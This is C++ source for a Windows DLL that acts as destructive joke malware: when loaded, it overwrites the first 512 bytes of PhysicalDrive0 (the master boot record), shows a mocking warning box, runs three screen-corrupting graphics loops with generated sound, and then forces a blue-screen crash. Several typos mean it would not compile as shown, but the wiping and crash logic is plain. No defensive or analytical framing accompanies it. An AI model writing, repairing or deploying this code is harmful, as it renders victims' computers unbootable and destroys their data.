#include <Windows.h>
#include <mmsystem.h>
#include <tchar.h>
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI P(NTSTATUS, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI B(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

VOID WINAPI Overwrite(){
  DWORD main;
  char d[512];
  ZeroMemory(&d, sizeof(main));
  HANDLE mbr = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_ALL, fILE_SHAR_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
  WriteFile(mbr, d, 512, &main, NULL);
  CloseHandle(mbr);
}

VOID WINAPI BSOD(){
  BOOLEAN p;
  unsigned long b;
  P(19, true, false, &p);
  B(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &b);
}

class Payloads{
  public:
    DWORD WINAPI PL(HMODULE a){
      HDC desk = GetDC(0);
      HBITMAP h = CreateCompatibleBitmap(desk, rand() % 255, rand() % 355);
      int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
      while(1){
        desk = GetDC(0);
        BitBlt(desk, rand() % 255, rand() % 155, m, p, desk, rand() % 255, rand() % 155, NOTSRCERASE);
        PatBlt(desk, rand() % 155, rand() % 255, m, p, PATINVERT);
      }
      return 0;
    }
    DWORD WINAPI PL2(HMODULE a){
      HDC desk = GetDC(0);
      HDC d = CreateCompatibleDC(desk);
      HBITMAP h = CreateCompatibleBitmap(desk, rand() % 155, rand() % 255);
      int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
      while(1){
        desk = GetDC(0);
        StretchBlt(d, rand() % 255, rand() % 155, m - 1, p -1, desk, rand() % 255, rand() % 155, m, p, SRCCOPY);
        BitBlt(desk, rand() % 2, rand() % 2, m, p, d, rand() % 2, rand() % 2, SRCCOPY);
      }
    }
    DWORD WINAPI PL3(HMODULE a){
      HDC desk = GetDC(0);
      int m = GetSystemMetrics(0), p = GetSystemMetrics(1);
      while(1){
        desk = GetDC(0);
        StretchBlt(desk, rand() % 255, rand() % 255, m + 1, p + 1, desk, rand() % 155, rand() % 255, m, p, SRCCOPY);
        PatBlt(desk, rand() % 255, rand() % 155, m, p, PATINVERT);
      }
    }
};

VOID WINAPI Sound(){
  HWAVEOUT hwo = 0;
  WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
  waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

  char buffer[8000 * 20];

  for(DWORD t = 0; t < sizeof(buffer); t++)
    buffer[t] = static_cast<char>(t*(2 >> (1&t>>11))*(5+(3&t>>14))>>(3&t>>8)|t>>2);

  WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
  waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
  waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
  waveOutUnprepareHeader(Hwo, &hdr, sizeof(WAVEHDR));
  waveOutClose(hwo);
}

VOID WINAPI Sound2(){
  HWAVEOUT hwo = 0;
  WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
  waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

  char buffer[8000 * 20];

  for(DWORD t = 0; t < sizeof(buffer); t++)
    buffer[t] = static_cast<char>(t*(t&16384?6:5)*(1+(1&t>>12))>>(3&t>>8)|t>>3);

  WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
  waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
  waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
  waveOutUnprepareHeader(Hwo, &hdr, sizeof(WAVEHDR));
  waveOutClose(hwo);
}

VOID WINAPI Sound3(){
  HWAVEOUT hwo = 0;
  WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
  waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

  char buffer[8000 * 20];

  for(DWORD t = 0; t < sizeof(buffer); t++)
    buffer[t] = static_cast<char>(t*((t >> 20 | t >> 10 & 3)&32 >> 10 | t >> 7 * 2));

  WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
  waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
  waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
  waveOutUnprepareHeader(Hwo, &hdr, sizeof(WAVEHDR));
  waveOutClose(hwo);
}

DLL_EXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        Overwrite();
        PayLoads pll;
        MessageBox(NULL, L"omg you're a skid and you injected aids into my dll omg i'm so offended just look at my very angry warning sign!!1111 >:(((( now your computer die now!!!!!11", L"omg how dare you", MB_ICONWARNING);
        HANDLE thread = CreateThread(0, 0, pll.PL, hinstDLL, 0, 0);
        Sound();
        Sleep(20000);
        TerminateThread(thread, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        HANDLE thread2 = CreateThread(0, 0, pll.PL2, hinstDLL, 0, 0);
        Sound2();
        Sleep(20000);
        TerminateThread(thread2, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        HANDLE thread3 = CreateThread(0, 0, pll.PL3, hinstDLL, 0, 0);
        Sound3();
        Sleep(20000);
        TerminateThread(thread3, 0);
        InvalidateRect(0, 0, 0);
        Sleep(1000);
        BSOD();
    }
    return TRUE;
}
